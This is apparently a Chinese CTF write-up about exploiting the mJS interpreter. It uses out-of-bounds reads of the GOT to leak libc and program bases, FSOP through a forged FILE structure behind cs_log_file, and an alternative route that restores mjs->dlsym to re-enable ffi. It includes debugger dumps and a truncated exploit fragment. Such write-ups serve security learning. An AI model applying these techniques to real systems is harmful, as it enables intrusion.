      mjs_set(mjs, v, "parse", ~0,
              mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_op_json_parse));
      mjs_set(mjs, obj, "JSON", ~0, v);
      /*
       * Populate Object.create()
       */
      v = mjs_mk_object(mjs);
      mjs_set(mjs, v, "create", ~0,
              mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_op_create_object));
      mjs_set(mjs, obj, "Object", ~0, v);
      /*
       * Populate numeric stuff
       */
      mjs_set(mjs, obj, "NaN", ~0, MJS_TAG_NAN);
      mjs_set(mjs, obj, "isNaN", ~0,
              mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_op_isnan));
    }
# 利用
## 理想计划
上面这些函数也可以用作越界的base，没什么太大的区别。程序开启了Full
RelRO，没法做GOT劫持，但我们可以相对地址越界读取GOT表，泄漏出libc，然后写libc。写libc需要知道libc和base的偏移，也就是得知道程序段的绝对地址。再看看程序的数据段上还有什么。
    pwndbg> tele 0x555555781000 500
    00:0000│   0x555555781000 (data_start) ◂— 0x0
    01:0008│   0x555555781008 (__dso_handle) ◂— 0x555555781008
    02:0010│   0x555555781010 (cs_log_cur_msg_level) ◂— 0xffffffff
    03:0018│   0x555555781018 (cs_to_hex.hex) —▸ 0x555555579732 ◂— xor    byte ptr [rcx], dh
    ... ↓
    05:0028│   0x555555781028 ◂— 0x0
    06:0030│   0x555555781030 (s_assign_ops) ◂— 0x1e00000005
    07:0038│   0x555555781038 (s_assign_ops+8) ◂— 0x200000001f
    08:0040│   0x555555781040 (s_assign_ops+16) ◂— 0x2400000021 /* '!' */
    09:0048│   0x555555781048 (s_assign_ops+24) ◂— 0x2f0000002e /* '.' */
    ...
    1a:00d0│   0x5555557810d0 (s_postfix_ops) ◂— 0x1c0000001d
    1b:00d8│   0x5555557810d8 (s_postfix_ops+8) ◂— 0x0
    1c:00e0│   0x5555557810e0 (opcodetostr.names) —▸ 0x55555557bc62 ◂— push   r8 /* 'NOP' */
    1d:00e8│   0x5555557810e8 (opcodetostr.names+8) —▸ 0x55555557bc66 ◂— push   rdx /* 'DROP' */
    ...
    43:0218│   0x555555781218 (completed) ◂— 0x0
    44:0220│   0x555555781220 (cs_log_level) ◂— 0x0
    45:0228│   0x555555781228 (cs_log_file) ◂— 0x0
    46:0230│   0x555555781230 (s_file_level) ◂— 0x0
    47:0238│   0x555555781238 ◂— 0x0
    48:0240│   0x555555781240 ◂— 0x0
    49:0248│   0x555555781248 ◂— 0x0
    ...
可以看到有一些字节码定义的常量，于是我们可以泄漏出程序段基地址。理想中我们可以越界写libc中的函数指针了，但是注意到`getprop_builtin_foreign`中idx是个int，而libc和程序段的偏移超出了int范围。所以写libc的计划不可行。
能不能写一些函数指针呢？这时我们继续观察程序数据段，发现没有任何堆指针。
    pwndbg> tele 0x555555781200 200
    00:0000│   0x555555781200 (opcodetostr.names+288) —▸ 0x55555557bd93 ◂— pop    r15 /* 'BCODE_HDR' */
    01:0008│   0x555555781208 (opcodetostr.names+296) —▸ 0x55555557bd9d ◂— push   r10 /* 'ARGS' */
    02:0010│   0x555555781210 (opcodetostr.names+304) —▸ 0x55555557bda2 ◂— push   r10 /* 'FOR_IN_NEXT' */
    03:0018│   0x555555781218 (completed) ◂— 0x0
    ... ↓
回头再看代码发现，各种变量都在栈上，栈地址看起来也是无从泄漏。此时陷入僵局。
## FSOP
但想来想去只能从数据段上入手，在IDA中观察发现刚刚忽略了`cs_log_level`和`cs_log_file`这两个全局变量，而`cs_log_file`是`FILE
*`！
交叉引用发现`cs_log_set_file`负责设置变量，但没有其他函数调用它；另外还有`cs_log_printf`和`cs_log_print_prefix`使用了`cs_log_file`。
    int cs_log_print_prefix(enum cs_log_level level, const char *file, int ln) {
    ...
      if (level > cs_log_level && s_file_level == NULL) return 0;
    ...
      if (s_file_level != NULL) {
    ...
      }
      if (cs_log_file == NULL) cs_log_file = stderr;
      cs_log_cur_msg_level = level;
      fwrite(prefix, 1, sizeof(prefix), cs_log_file);
    ...
    }
大致逻辑就是判断参数`level`和`cs_log_level`的大小，大于就返回，小于就输出到`cs_log_file`。如果是NULL就把`cs_log_file`赋值为`stderr`再输出，最终都是调用`fwrite`。
程序中有大量调用该函数的地方，  
enum的定义如下。
    enum cs_log_level {
      LL_NONE = -1,
      LL_ERROR = 0,
      LL_WARN = 1,
      LL_INFO = 2,
      LL_DEBUG = 3,
      LL_VERBOSE_DEBUG = 4,
      _LL_MIN = -2,
      _LL_MAX = 5,
    };
可以看到我们只要调高`cs_log_level`即可触发上述函数。在此之前我们可以先控制`FILE*
cs_log_file`，让它指到数据段后面，再在数据段后面伪造FILE结构体，利用fwrite做FSOP。
本地先对着有符号的程序调，调的差不多了上目标程序，先搞泄漏试着打远程，发现libc不一致，远程是2.27的，这时重新调整一波继续编写即可。
最终代码如下：
    function relread(offset) {
        let a = [];
        let i = 0;
        for(i=0; i>(idlsym = dlsym;
    +  mjs->dlsym = NULL;
     }
既然可以通过`getMJS`拿到mjs对象，而我们又可以越界读GOT拿到libc地址，所以我们把`mjs->dlsym`重新恢复，即可使得`ffi`可用，非常简洁明了的利用方法。